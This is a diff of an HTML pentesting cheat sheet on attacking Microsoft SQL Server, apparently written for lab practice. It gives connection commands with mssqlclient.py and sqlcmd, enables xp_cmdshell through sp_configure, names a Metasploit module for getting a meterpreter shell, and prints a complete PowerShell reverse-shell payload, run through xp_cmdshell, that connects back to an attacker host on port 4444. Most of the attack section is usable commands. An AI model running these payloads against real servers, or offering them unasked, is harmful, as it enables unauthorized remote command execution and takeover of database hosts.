@@ -35,9 +35,6 @@
                 <li><b>msdb</b>	The SQL Server Agent uses this database to schedule jobs & alerts</li>
                 <li><b>tempdb</b>	Stores temporary objects</li>
                 <li><b>resource</b>	Read-only database containing system objects included with SQL server</li> 
-
-
-
             </ul>
 
             <h2>Usage</h2>
@@ -47,6 +44,10 @@
                 <pre><code class="language-bash">mssqlclient.py user:password@IP_VICTIM</code></pre>
                 <p>In case the user you are using is not present in MSSQL SRV users you can use a domain authentication using the the flag...</p>
                 <pre><code class="language-bash">mssqlclient.py user:password@IP_VICTIM -windows-auth</code></pre>
+                <p>In case you are peroforming the connection from a Windows you could do</p>
+                <pre><code class="language-cmd">sqlcmd -S 10.129.20.13 -U username -P Password123</code></pre>
+                
+
             </ul>
 
             <h3>Useful commands</h3>
@@ -113,6 +114,8 @@ RECONFIGURE;
 
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;</code></pre>
+                <b>You can alternativelly use the metasploit module "exploit/windows/mssql/mssql_payload" and gather a meterpreter sher</b>    
+
                 <h4> Reverse Socket connection </h4>
                 <pre><code class="language-sql">EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.18'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"';</code></pre>
                 <p>It is highly recomended to capture it using metasploit. Check this out</p>
